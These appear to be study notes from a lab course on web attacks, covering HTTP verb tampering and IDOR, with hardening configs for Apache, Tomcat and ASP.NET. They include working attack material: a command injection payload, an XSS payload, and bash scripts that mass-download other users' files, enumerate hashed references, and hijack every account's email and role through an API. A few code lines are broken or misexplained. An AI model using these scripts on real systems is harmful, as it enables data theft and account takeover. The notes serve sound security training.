# Web Attacks

- Web applications are increasingly essential for businesses, making their security a top priority.
- As web apps grow more complex, attack methods also evolve, creating larger attack surfaces.
- Web attacks can compromise internal networks, steal assets, disrupt services, and cause financial losses.

**Scope of Risk:**

- External-facing web apps are primary targets but internal web apps and API endpoints are also vulnerable.
- Protecting both external and internal web services is crucial to prevent unauthorized access and data breaches.

**Module Focus:**

- This module covers three critical web attack types:
    1. **HTTP Verb Tampering**
    2. **Insecure Direct Object References (IDOR)**
    3. **XML External Entity (XXE) Injection**

---

### Web Attack Summaries

**1. [HTTP Verb Tampering:](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering)**

- Exploits web servers that accept multiple HTTP verbs/methods.
- Malicious requests using unexpected methods can bypass authorization/security controls.
- Targets misconfigured servers to bypass normal protections and access restricted resources.

**2. [Insecure Direct Object References (IDOR):](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)**

- Exploits lack of strong access control mechanisms.
- Allows attackers to access unauthorized data by manipulating or guessing object IDs (e.g., sequential numbers).
- Common in systems where files/resources are directly referenced without adequate validation.

**3. [XML External Entity (XXE) Injection:](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)**

- Targets web apps processing XML data with outdated libraries.
- Malicious XML payloads can disclose sensitive files (config files, source code) from the back-end server.
- Can lead to further exploitation such as stealing credentials or remote code execution.

# HTTP Verb Tempering

- HTTP verbs (methods) dictate the type of action performed on a web server.
- Web apps typically focus on GET and POST methods, but servers may accept other verbs like PUT, DELETE, etc.
- Misconfigurations can expose sensitive functionalities to unauthorized users through unexpected HTTP methods.

---

### HTTP Methods and Their Uses:

- **`GET`**– Retrieves data.
- **`POST`** – Submits data to be processed.
- **`HEAD`**– Like GET but returns only headers (no body).
- **`PUT`**– Writes/replaces resource data.
- **`DELETE`**– Deletes specified resources.
- **`OPTIONS`**– Lists allowed methods.
- **`PATCH`**– Partially updates resources.

---

### **Misconfigured Web Server (Authentication Bypass):**

- Authentication may be limited to GET/POST, leaving HEAD or other methods unrestricted.
- Example, a system admin may use the following configuration to require authentication on a particular web page:
    
    ```xml
    <Limit GET POST>
        Require valid-user
    </Limit>
    ```
    
- **Risk:** An attacker can send HEAD requests to bypass this and access restricted pages.

### **Insecure Coding (Filter Inconsistency):**

- Developers may apply filters to GET requests but overlook POST/other methods.
- For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters:
    
    ```php
    $pattern = "/^[A-Za-z\s]+$/";
    if(preg_match($pattern, $_GET["code"])) {
        $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    }
    ```
    
- We can see that the sanitization filter is only being tested on the **`GET`**parameter.
- The `$_REQUEST["code"]` parameters are being used, which may also contain `POST` parameters, `leading to an inconsistency in the use of HTTP Verbs`. In this case, an attacker may use a `POST` request to perform SQL injection,
- **Risk:** Attacker can bypass input sanitization by sending a **`POST`**request, leading to vulnerabilities like SQL injection.

### Common Exploits:

- Use HTTP methods (e.g., PUT or DELETE) to upload/delete files.
- Leverage HEAD or OPTIONS to bypass authentication or access restricted data.

---

## Bypassing Basic Authentication with HTTP Verb Tampering

Exploiting HTTP Verb Tampering vulnerabilities involves using alternate HTTP methods to bypass web server restrictions, potentially avoiding Basic Authentication prompts.

---

### Types of HTTP Verb Tampering Vulnerabilities

**1. Insecure Web Server Configurations (Common)**

- Direct bypass of Basic Authentication by using alternate HTTP methods.
- Can often be detected by automated tools.

**2. Insecure Coding Practices (Less Common)**

- Bypasses security filters through manual testing.
- Requires active exploitation and deeper analysis.

---

### Identification Phase:

1. Scenario:

- Web app allows file uploads but restricts file deletion (Reset button).
- Clicking Reset triggers Basic Authentication (401 Unauthorized).

2. Observation:

- Reset functionality is located at `/admin/reset.php`.
- Visiting `/admin` triggers an authentication prompt, indicating the entire directory is protected.

---

### Exploitation Phase:

**1. Initial Attempt (POST Method):**

- Intercept request with Burp Suite after clicking Reset.
- The intercepted request is a **GET** request.
- Change the method to **POST** to test if authentication bypasses POST requests.
- **Result:**
    - **401 Unauthorized** (Authentication covers POST).

**2. Testing Alternative Methods (HEAD Method):**

- **HEAD** is similar to **GET** but does not return the response body.
- Use an OPTIONS request to see accepted methods:
**Response:**
    
    ```bash
    curl -i -X OPTIONS http://SERVER_IP:PORT/
    ```
    
    ```php
    HTTP/1.1 200 OK
    Allow: POST,OPTIONS,HEAD,GET
    ```
    
- **HEAD** is allowed.

**3. Performing the Attack:**

- Intercept the reset request and change the method to **HEAD**.

![image.png](image%20117.png)

![image.png](image%20118.png)

- Forward the request.

**4. Result:**

- No login prompt.
- Empty output (as expected with HEAD).
- Visiting the File Manager confirms successful file deletion.

---

### Recommendations:

- Test other HTTP methods (e.g., PUT, DELETE).
- Implement strict method controls in server configurations.
- Use WAF (Web Application Firewalls) to block unauthorized methods.

# Bypassing Basic Authentication with HTTP Verb Tampering

Exploiting HTTP Verb Tampering vulnerabilities involves using alternate HTTP methods to bypass web server restrictions, potentially avoiding Basic Authentication prompts.

---

## Types of HTTP Verb Tampering Vulnerabilities

### 1. Insecure Web Server Configurations (Common)

- Direct bypass of Basic Authentication by using alternate HTTP methods.
- Can often be detected by automated tools.

### 2. Insecure Coding Practices (Less Common)

- Bypasses security filters through manual testing.
- Requires active exploitation and deeper analysis.

---

## Identification Phase:

### 1. Scenario:

- Web app allows file uploads but restricts file deletion (Reset button).
- Clicking Reset triggers Basic Authentication (401 Unauthorized).

### 2. Observation:

- Reset functionality is located at `/admin/reset.php`.
- Visiting `/admin` triggers an authentication prompt, indicating the entire directory is protected.

---

## Exploitation Phase:

### 1. Initial Attempt (POST Method):

- Intercept request with Burp Suite after clicking Reset.
- The intercepted request is a **GET** request.
- Change the method to **POST** to test if authentication bypasses POST requests.
- **Result:**
    - **401 Unauthorized** (Authentication covers POST).

### 2. Testing Alternative Methods (HEAD Method):

- **HEAD** is similar to **GET** but does not return the response body.
- Use an OPTIONS request to see accepted methods:
**Response:**
    
    ```bash
    curl -i -X OPTIONS http://SERVER_IP:PORT/
    ```
    
    ```php
    HTTP/1.1 200 OK
    Allow: POST,OPTIONS,HEAD,GET
    ```
    
- **HEAD** is allowed.

### 3. Performing the Attack:

- Intercept the reset request and change the method to **HEAD**.
- Forward the request.

### 4. Result:

- No login prompt.
- Empty output (as expected with HEAD).
- Visiting the File Manager confirms successful file deletion.

---

# Bypassing Security Filters

HTTP Verb Tampering vulnerabilities caused by insecure coding errors can lead to bypassing security filters. This often happens when the web application doesn't account for all HTTP methods during malicious request detection.

---

## Identification Phase:

### 1. Scenario:

- File Manager web app blocks file creation with special characters (e.g., `test;`).
- Backend filters block injection attempts, returning a "Malicious Request Denied!" message.

---

## Exploitation Phase:

### 1. Initial Attempt:

- Intercept the request with Burp Suite.
- Change the HTTP method (e.g., POST to GET).

![image.png](image%20119.png)

- **Result:**
    
    ![image.png](image%20120.png)
    
    - File created successfully without triggering the security filter.

### 2. Testing Command Injection:

- Inject a command to create multiple files:
    
    ```bash
    file1; touch file2;
    ```
    
- Change the method to **GET** and forward the request.

![image.png](image%20121.png)

### 3. Result:

- Both `file1` and `file2` are created, confirming filter bypass and successful command injection.

---

## Conclusion:

- HTTP Verb Tampering can bypass both Basic Authentication and backend security filters.
- **Recommendations:**
    - Test all HTTP methods during development.
    - Implement comprehensive filters covering all HTTP methods.
    - Regularly audit and patch web applications to mitigate risks.

# **Preventing HTTP Verb Tampering**

### **1. Insecure Configuration – The Root Cause**

- **Vulnerable Servers:** Apache, Tomcat, ASP.NET.
- **Why It Happens:**
    - Configuration limits access based on specific HTTP methods (e.g., GET).
    - Other HTTP methods (POST, PUT, DELETE, HEAD) remain unprotected.

---

### **2. Vulnerable Configurations:**

### **Apache Example (000-default.conf) or .htaccess web page config file:**

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

**Vulnerability:**

- Only GET requests require authentication.
- POST, HEAD, or OPTIONS can bypass this restriction.

**Fix (Apache):**

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <LimitExcept GET POST>
        Require valid-user
    </LimitExcept>
</Directory>
```

**Why This Works:**

- **`LimitExcept`** ensures all methods, except GET and POST, require authentication.

---

### **Tomcat Example (web.xml):**

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

**Vulnerability:**

- Only GET is protected.
- POST, DELETE, etc., bypass protection.

**Fix (Tomcat):**

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
    <http-method-omission>GET</http-method-omission>
</security-constraint>
```

**Why This Works:**

- **`http-method-omission`** blocks all methods except GET.

---

### **ASP.NET Example (web.config):**

```xml
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

**Vulnerability:**

- Only GET is checked.
- POST, PUT bypass restrictions.

**Fix (ASP.NET):**

```xml
<system.web>
    <authorization>
        <allow roles="admin" />
        <deny users="*" />
    </authorization>
</system.web>
```

**Why This Works:**

- Access control applies to **all HTTP methods** by default.

---

### **3. Key Configuration Fixes:**

- **Apache:** Use `<LimitExcept>` instead of `<Limit>`.
- **Tomcat:** Use `<http-method-omission>` to block all methods except specified ones.
- **ASP.NET:** Apply authorization to all methods by default (`<deny users="*">`).

---

### **4. Insecure Coding – A Deeper Issue:**

### **Example (PHP Code):**

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

**Vulnerability:**

- **`$_REQUEST`** accepts GET, POST, COOKIE parameters.
- **`preg_match`** filters only POST, but GET can bypass it.

**Fix (PHP):**

```php
if (isset($_POST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_POST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

**Why This Works:**

- Ensures **consistent HTTP method** usage (`$_POST` only).

---

### **5. General Best Practices:**

1. **Consistency Across HTTP Methods:**
    - Use the same HTTP method throughout authentication and authorization flows.
    - E.g., Always check POST parameters if POST is required for actions.
2. **Expand Security Filters:**
    - Ensure all parameters (GET, POST, etc.) are validated.
    - It is always advised to `expand the scope of testing in security filters` by testing all request parameters. This can be done with the following functions and variables:
        - **PHP:** `$_REQUEST['param']` → `$_POST['param']` or `$_GET['param']` explicitly.
        - **Java:** `request.getParameter('param')`.
        - **C#:** `Request['param']`.
3. **Deny Unused Methods:**
    - Disable or restrict **HEAD**, **OPTIONS**, and **TRACE** unless necessary.
    - Example (Apache):
        
        ```xml
        RewriteCond %{REQUEST_METHOD} ^(TRACE|TRACK)
        RewriteRule .* - [F]
        ```
        

---

### **6. Key Takeaways:**

- **Misconfigurations** often lead to verb tampering.
- **Avoid relying on specific methods** for protection (e.g., GET).
- Use **deny-all** by default and explicitly allow required methods.
- Perform **comprehensive testing** across all HTTP methods during security audits.

# Insecure Direct Object References (IDOR) Vulnerabilities

IDOR vulnerabilities are common and pose significant risks to web applications. They occur when:

- A web application exposes direct references to objects (e.g., files or database resources).
- Users can manipulate these references to access unauthorized data.
- The absence of robust **access control systems** allows exploitation.

**Example:**

- User uploads a file accessible via `download.php?file_id=123`.
- By changing `file_id=123` to `file_id=124`, unauthorized files might be accessible if no access control exists.

## Key Characteristics of IDOR

- **Exposing Direct References**: Directly exposing file IDs, URLs, or object references is not inherently vulnerable. The danger lies in **weak or missing access controls**.
- **Access Control Failures**:
    - Front-end restrictions can be bypassed by modifying HTTP requests.
    - Without back-end verification, unauthorized access is possible.
- **Role of Back-end Access Control**:
    - Solutions like **Role-Based Access Control (RBAC)** can mitigate risks.
    - Without RBAC, users may access or modify others' data by manipulating object references.

## Why IDOR is Prevalent

- **Complexity of Access Control**: Building comprehensive access control systems is challenging.
- **Developer Oversight**: Many developers neglect to implement proper back-end access control.
- **Large Applications**: Even major platforms (e.g., Facebook, Instagram) have experienced IDOR vulnerabilities.

## Impact of IDOR Vulnerabilities

- **Information Disclosure**: Access to private data (e.g., personal files, credit card info).
- **Data Modification/Deletion**: Attackers may alter or delete other users' data.
- **Privilege Escalation**:
    - Elevating privileges from standard users to admins.
    - Exploiting insecure admin-only functions through manipulated requests.
- **Account Takeover**: Can lead to full control over user accounts or entire applications.

## Exploitation Process

1. **Identify Direct References** – URLs, file IDs, or API parameters.
2. **Test for Access** – Increment or guess values to access unauthorized data.
3. **Privilege Escalation** – Invoke admin-only functions by modifying requests.

## Prevention and Mitigation

- **Implement Strong Access Controls** – Ensure every resource request is authenticated and authorized.
- **Use RBAC** – Define roles and enforce restrictions at the back-end level.
- **Avoid Direct References** – Use indirect references (e.g., hashed IDs).
- **Continuous Testing** – Regularly audit for access control flaws.
- **Least Privilege Principle** – Restrict access to the minimum necessary level.

---

**IDOR vulnerabilities** remain one of the most critical security risks for web and mobile applications due to their potential for **data exposure, modification, and privilege escalation**.

# Identifying and Exploiting IDOR Vulnerabilities

## 1. Identifying Direct Object References (DOR)

- **Key Focus**: Look for object references in URL parameters, APIs, and HTTP headers (e.g., `?uid=1` or `?filename=file_1.pdf`).
- **Testing**:
    - Increment object references (`?uid=2` or `?filename=file_2.pdf`).
    - Use fuzzing tools to test variations for unauthorized data access.

## 2. AJAX Calls and Front-End Analysis

- **Inspect JavaScript** for AJAX calls that reference object identifiers (may reveal unused APIs).
- **Example**:
    
    ```jsx
    function changeUserPassword() {
        $.ajax({
            url:"change_password.php",
            type: "post",
            dataType: "json",
            data: {uid: user.uid, password: user.password, is_admin: is_admin},
            success:function(result){
                //
            }
        });
    }
    ```
    
- **Approach**:
    - Check front-end code for disabled but present admin/user functions.
    - Test for vulnerabilities by invoking admin functions directly.

## 3. Encoded/Hashed Object References

- **Encoding**:
    - Decode base64 references (e.g., `?filename=ZmlsZV8xMjMucGRm` → `file_123.pdf`).
    - Re-encode modified references to access unauthorized data.
- **Hashing**:
    
    ```jsx
    $.ajax({
        url:"download.php",
        type: "post",
        dataType: "json",
        data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
        success:function(result){
            //
        }
    });
    ```
    
    - Identify hashing algorithms (MD5, SHA-1, etc.).
    - Replicate hash for other file names to attempt unauthorized access.

## 4. Comparing User Roles

- **Method**:
    - Create multiple accounts to compare API responses and object references.
- **Example**:
    
    ```json
    {
      "attributes" :
        {
          "type" : "salary",
          "url" : "/services/data/salaries/users/1"
        },
      "Id" : "1",
      "Name" : "User1"
    }
    ```
    
    - Replay user API calls with different user sessions to detect role-based IDOR vulnerabilities.

## 5. Summary

- **Targets**:
    - URL parameters, APIs, AJAX calls, encoded references.
- **Techniques**:
    - Incrementing values, fuzzing, decoding/encoding, replaying API calls.
- **Indicators**:
    - Successful unauthorized access or data retrieval confirms IDOR vulnerability.

---

# Mass IDOR Enumeration and Exploitation

## 1. Insecure Parameters – Basic Example

- **Scenario**: Employee Manager web application with documents tied to user ID (`uid`).
- **Example URL**:
    
    ```
    http://SERVER_IP:PORT/documents.php?uid=1
    ```
    
- **Observation**:
    - Files follow predictable naming patterns:
        
        ```html
        /documents/Invoice_1_09_2021.pdf
        /documents/Report_1_10_2021.pdf
        ```
        
    - Changing `uid` to `2` may expose other employees' documents:
        
        ```
        http://SERVER_IP:PORT/documents.php?uid=2
        ```
        
    - Clicking the links reveals unauthorized files, confirming an IDOR vulnerability.

- If for example we don’t see any **`uid`** or similar to it we can intercept the request via Burp Suite and check there.

![image.png](image%20122.png)

---

## 2. Mass Enumeration Technique

### Automated Enumeration – Using Bash Script

- **Objective**: Download all employee documents in bulk.
- **HTML Pattern Extraction**
    
    ```html
    <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
    <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
    ```
    
- **Curl and Grep Example**:
    
    ```bash
    curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
    ```
    
- **Regex Extraction**:
    
    ```bash
    curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
    #/documents/Invoice_3_06_2020.pdf
    #/documents/Report_3_01_2020.pdf
    ```
    

---

## 3. Automated Bash Script – Mass Download

```bash
#!/bin/bash

url="http://$1"

for i in {1..20}; do
	for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); 
	do
		wget -q $url$link
	done
done
```

```bash
bash scr.sh 94.237.51.209:47663
```

- **Explanation**:
    - Loops through `uid=1` to `uid=20`.
    - Extracts document links using `curl` and `grep`.
    - Downloads documents with `wget`.
    - **`$1, $2, ...`** – Positional parameters (arguments).
    - **`$variable`** – References the value of a variable.
    - **`$(command)`** – Executes the command and substitutes the result.

---

- **Detection**: Look for patterns in file names and URL parameters.
- **Tools**:
    - **Burp Suite (Intruder)** – Automates parameter fuzzing.
    - **ZAP Fuzzer** – Fuzzes URLs and parameters.
    - **Custom Scripts** – Bash, PowerShell, Python for automation.

---

# Bypassing Encoded References and Mass Enumeration in IDOR Exploitation

- **Objective**: Bypass encoded or hashed object references to exploit IDOR vulnerabilities.
- **Scenario**: Employee Manager web application with contracts downloadable through hashed references.

## 1. Identifying Encoded Object References

- **Example Request (Intercepted in Burp)**:
    
    ```php
    contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
    ```
    
- **Observation**:
    - The application uses `md5` hashing to obscure the `contract` value.
    - Direct enumeration of `uid` in cleartext is not possible.

---

## 2. Analyzing Front-End Code for Hashing Techniques

- **Function Disclosure (Front-End)**:
    
    ```jsx
    function downloadContract(uid) {
        $.redirect("/download.php", {
            contract: CryptoJS.MD5(btoa(uid)).toString(),
        }, "POST", "_self");
    
    ```
    
- **Key Observations**:
    - Hashing process:
        - `uid` is base64 encoded (`btoa(uid)`).
        - The result is hashed using `md5`.
    - Example:
        
        ```jsx
        downloadContract('1')  →  btoa(1)  →  md5("MQ=="
        ```
        

---

## 3. Reversing the Hashing Process

- **Manual Testing**:
    
    ```bash
    echo -n 1 | base64 -w 0 | md5sum
    # cdd96d3cc73d1dbdaffa03cc6cd7339b
    ```
    
- **Explanation**:
    - `n`: Prevents newline characters.
    - `w 0`: Avoids wrapping in base64 encoding.
    - The resulting hash matches the `contract` value in the intercepted request.

---

## 4. Mass Enumeration with Bash Script

- **Goal**: Automate contract downloads for multiple users.
- **Hash Generation for Multiple UIDs**:
    
    ```bash
    for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
    ```
    
- **Result**:
    
    ```
    cdd96d3cc73d1dbdaffa03cc6cd7339b
    0b7e7dee87b1c3b98e72131173dfbbbf
    0b24df25fe628797b3a50ae0724d2730
    ...
    ```
    

---

## 5. Downloading Contracts via POST Requests

- **Bash Script for Automated Downloads**:
    
    ```bash
    #!/bin/bash
    
    for i in {1..10}; do
        for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
            curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
        done
    don
    ```
    
- **Explanation**:
    - Loops through `uid=1` to `uid=10`.
    - Generates `md5` hash for each `uid` using the same technique.
    - Sends a POST request to `download.php` for each hashed contract reference.
    - `sOJ`: Silent, output to file, with filename from server.

---

## 6. Running the Exploit

- **Execute**:
    
    ```bash
    bash ./exploit.sh
    
    # contract_006d1236aee3f92b8322299796ba1989.pdf
    # contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
    # contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
    ```
    
- **Result**: All employee contracts for `uid=1` to `uid=10` are downloaded, bypassing the hashing mechanism.

---

---

After spawning the target machine and viewing the page source of the `/contracts.php` page, students will notice that the `/download.php` page takes the `contract` parameter with the value being the base64 of `uid`:

![image.png](image%20123.png)

We write a script that will loop over the different employees' `uid` from 1 to 20 and base64 encode them so that they get passed as values for the `contract` parameter and download the corresponding files:

```bash
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0); do
        curl -sOJ "http://IP:PORT/download.php?contract=$hash"
    done
done
```

## Key Takeaways

- **Technique**:
    - Identify front-end encoding or hashing mechanisms.
    - Reverse engineer and replicate the hashing process to bypass encoded references.
- **Automation**:
    - Use bash scripts for efficient mass enumeration.
    - Adapt techniques for tools like Burp Intruder or ZAP Fuzzer when necessary.
- **Security Insight**:
    - JavaScript-based hashing on the client side can expose sensitive workflows.
    - Always audit front-end code for potential vulnerabilities in modern web applications.

# IDOR in Insecure APIs – Identification and Exploitation

## 1. Introduction to IDOR in APIs

- **Objective**: Exploit IDOR vulnerabilities in API endpoints to perform unauthorized actions (e.g., updating user data, modifying roles, or accessing other users' data).
- **Types of API-Based IDORs**:
    1. **Information Disclosure** – Read sensitive data belonging to other users.
    2. **Insecure Function Calls** – Execute functions or change data as other users.

---

## 2. Identifying Insecure APIs

- **Scenario**: Employee Manager web application with an "Edit Profile" feature.
- **Endpoints**:
    
    ```
    http://SERVER_IP:PORT/profile/index.php
    ```
    
- **Profile Update Request (Intercepted in Burp)**:
    
    ```json
    {
        "uid": 1,
        "uuid": "40f5888b67c748df7efba008e7c2f9d2",
        "role": "employee",
        "full_name": "Amy Lindon",
        "email": "a_lindon@employees.htb",
        "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
    }
    ```
    
    ![image.png](image%20124.png)
    
- **Key Observations**:
    - PUT request to:
        
        ```bash
        PUT /profile/api.php/profile/1 HTTP/1.1
        ```
        
    - Parameters:
        - `uid`: User ID (controls which user's data to update).
        - `uuid`: Universally Unique Identifier.
        - `role`: User privilege level (employee/admin).
    - **Security Issue**: Access control privileges (`role`) are client-controlled, sent in cookies or JSON, creating potential for manipulation.

---

## 3. Exploiting Insecure APIs

### 3.1 Basic Exploitation Attempts

1. **Changing `uid` to Another User’s ID**:
    
    ```json
    "uid": 2
    ```
    
    - **Result**: `uid mismatch` – Endpoint compares the request’s `uid` to the API URL (`/1`), blocking unauthorized changes.
    
    ![image.png](image%20125.png)
    
2. **Changing the API Endpoint**:
    
    ```
    /profile/api.php/profile/2
    ```
    
    - Adjust `uid` to `2` to match:
        
        ```json
        "uid": 2
        ```
        
    - **Result**: `uuid mismatch` – The API verifies that the provided `uuid` matches the target user's `uuid`.

---

### 3.2 Creating and Deleting Users via API

- **`POST`Request to Create New User**:
    
    ```json
    "uid": 5
    ```
    
    - **Error**: `Creating new employees is for admins only.`
- **`DELETE` Request to Remove Users**:
    
    ```json
    "uid": 2
    ```
    
    - **Error**: `Deleting employees is for admins only.`
- **Reason**: The application relies on the `role` cookie (`role=employee`), limiting operations to basic users.

---

### 3.3 Elevating Privileges

- **Modifying `role` Parameter**:
    
    ```json
    "role": "admin"
    ```
    
    - **Error**: `Invalid role` – Role names must match valid values in the back-end database.

---

## 4. Information Disclosure via GET Requests

- **Objective**: Test if GET requests to the API leak user data, bypassing the restrictions faced with PUT/POST/DELETE requests.
- **Testing**:
    
    ```
    GET /profile/api.php/profile/2
    ```
    
- **Expected Outcome**:
    - If vulnerable, this request may return the profile details of `uid=2` without triggering access control checks.
    - Leaked information (e.g., `uuid`) can assist in bypassing the mismatch errors for POST/PUT requests.

---

## 5. Exploiting Information Disclosure for IDOR Attacks

1. **Extract Details of Other Users**:
    
    ```bash
    curl http://SERVER_IP:PORT/profile/api.php/profile/2
                                                 
    # If successful: 
    # {"uid":"2","uuid":"4a9bd19b3b8676199592a346051f950c","role":"employee","full_name":"Iona Franklyn","email":"i_franklyn@employees.htb","about":"It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."} 
    ```
    
2. **Repeat with PUT Request**:
    
    ```json
    {
        "uid": 2,
        "uuid": "d9345f8a9f564e43b0a3f2d0ccaf52b3",
        "role": "admin",
        "full_name": "John Doe",
        "email": "j_doe@employees.htb"
    }
    ```
    
    - If the `uuid` matches, exploit the API to escalate the user’s role.

---

## 6. Automating Enumeration (Bash Script)

- **Mass Enumeration of Users via GET Requests**:
    
    ```bash
    #!/bin/bash
    url="http://SERVER_IP:PORT/profile/api.php/profile"
    
    for i in {1..100}; do
        curl -s "$url/$i" >> users.txt
    done
    ```
    
- **Output**:
    
    ```
    uid: 1, full_name: Amy Lindon
    uid: 2, full_name: John Doe
    uid: 3, full_name: Robert Miles
    ...
    ```
    

---

## 7. Key Takeaways

- **Access Control Issues**:
    - Placing role information (`role=employee`) in cookies or JSON creates attack vectors.
    - Insecure GET endpoints often leak sensitive data.
- **Exploitation Path**:
    - Use GET-based IDOR for information disclosure.
    - Leverage disclosed data (e.g., `uuid`) to bypass API protections in PUT/POST requests.
- **Defense Recommendations**:
    - Enforce back-end access control for all API calls.
    - Never trust user-supplied data for privilege escalation.
    - Implement proper role validation and session-based authorization.

---

# Chaining IDOR Vulnerabilities – Exploitation and Advanced Attacks

## 1. Overview

- **Goal**: Chain IDOR vulnerabilities to:
    1. Extract sensitive information through API GET requests.
    2. Modify other users' data using PUT requests.
    3. Escalate privileges by changing roles.
    4. Create or delete users by bypassing access controls.

---

## 2. Exploiting Information Disclosure (GET Requests)

- **Scenario**: Employee Manager web application retrieves user details via GET requests to an API endpoint.
- **Example Request**:
    
    ```json
    GET /profile/api.php/profile/2
    
    {
        "uid": "2",
        "uuid": "4a9bd19b3b8676199592a346051f950c",
        "role": "employee",
        "full_name": "Iona Franklyn",
        "email": "i_franklyn@employees.htb",
        "about": "It takes 20 years to build a reputation and a few minutes of cyber-incident to ruin it."
    }
    ```
    
- **Observation**:
    - User details (`uuid`) are exposed.
    - `uuid` is critical for PUT requests to modify user data.

---

## 3. Modifying Other Users' Details (PUT Requests)

- **Objective**: Use the disclosed `uuid` to send a PUT request and modify user data.
- **PUT Request Example**:
    
    ```json
    PUT /profile/api.php/profile/2
    
    {
        "uid": "2",
        "uuid": "4a9bd19b3b8676199592a346051f950c",
        "role": "employee",
        "full_name": "Modified Name",
        "email": "attacker@htb",
        "about": "Modified by attacker"
    }
    ```
    
- **Outcome**: User's profile is updated without triggering access control errors.

---

## 4. Attack Vectors from Modifying User Data

1. **Email Hijacking**:
    - Modify the target's email and request a password reset.
    - Gain unauthorized access to their account.
2. **XSS Injection**:
    - Inject malicious JavaScript in the `about` field.
        
        ```json
        "about": "<script>alert('XSS')</script>"
        ```
        
    - Executed when the user visits their profile.

---

## 5. Privilege Escalation by Role Modification

- **Goal**: Change the attacker's role to `web_admin` by intercepting the Update profile request.
- **PUT Request**:
    
    ```json
    {
        "uid": "1",
        "uuid": "40f5888b67c748df7efba008e7c2f9d2",
        "role": "web_admin",
        "full_name": "Amy Lindon",
        "email": "a_lindon@employees.htb",
        "about": "A Release is like a boat."
    }
    ```
    
- **Outcome**:
    - Role successfully updated to `web_admin` without triggering errors.
    - The attacker now has administrative privileges.

---

## 6. Creating New Users

- **Create User POST Request**:
    
    ```json
    POST /profile/api.php/profile
    
    {
        "uid": "5",
        "uuid": "newuseruuid",
        "role": "employee",
        "full_name": "New User",
        "email": "newuser@htb",
        "about": "New user created by admin."
    }
    ```
    
- **Outcome**:
    - The new user is created successfully.
    - No `admin only` error is triggered due to escalated privileges.

---

## 7. Automating User Enumeration and Modification (Bash Script)

- **Objective**: Enumerate all users and modify their emails.
- **Script**:
    
    ```bash
    #!/bin/bash
    url="http://SERVER_IP:PORT/profile/api.php/profile"
    
    for i in {1..10}; do
        user=$(curl -s "$url/$i")
        uuid=$(echo $user | jq -r '.uuid')
        curl -X PUT -d "{\"uid\": \"$i\", \"uuid\": \"$uuid\", \"email\": \"attacker@htb\"}" -H "Content-Type: application/json" "$url/$i"
    done
    
    ```
    
- **Explanation**:
    - Loops through `uid=1` to `uid=10`.
    - Extracts `uuid` using `jq` from JSON response.
    - Sends a PUT request to change each user’s email to `attacker@htb`.

---

## 8. Mass Privilege Escalation

- **Objective**: Escalate privileges for all users by changing their roles to `web_admin`.

Once we enumerate all users, we will find an admin user with the following details:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

![image.png](image%20126.png)

- **Script**:
    
    ```bash
    #!/bin/bash
    for i in {1..10}; do
        user=$(curl -s "$url/$i")
        uuid=$(echo $user | jq -r '.uuid')
        curl -X PUT -d "{\"uid\": \"$i\", \"uuid\": \"$uuid\", \"role\": \"web_admin\"}" -H "Content-Type: application/json" "$url/$i"
    done
    ```
    
- **Outcome**:
    - Escalates privileges for all users.
    - Full administrative control over all profiles.

---

## 9. Key Takeaways

- **Chaining IDORs**:
    - Combine information disclosure vulnerabilities with insecure function calls to escalate attacks.
- **Privilege Escalation**:
    - Modifying user roles can bypass access control if no back-end validation exists.
- **Persistent Access**:
    - Email hijacking and XSS attacks can establish long-term access to compromised accounts.
- **Automation**:
    - Automate user enumeration and mass modifications for scalability.

---

# IDOR Prevention – Best Practices and Techniques

## 1. Introduction to IDOR Prevention

